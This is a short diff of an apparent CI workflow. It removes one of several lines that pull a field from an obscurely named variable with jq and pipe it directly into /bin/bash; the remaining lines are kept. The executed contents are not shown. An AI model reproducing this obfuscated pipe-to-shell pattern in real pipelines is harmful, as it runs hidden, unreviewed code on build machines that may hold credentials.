@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$sfon599" | jq -r .r5874 | /bin/bash
           printf '%s' "$cswm0" | jq -r .l49 | /bin/bash
           echo $w9 | jq -r .z088 | /bin/bash
-          echo $b6658 | jq -r .qrgh0655 | /bin/bash
           printf '%s' "$jdh993" | jq -r .n62 | /bin/bash
 
       - name: Upload output
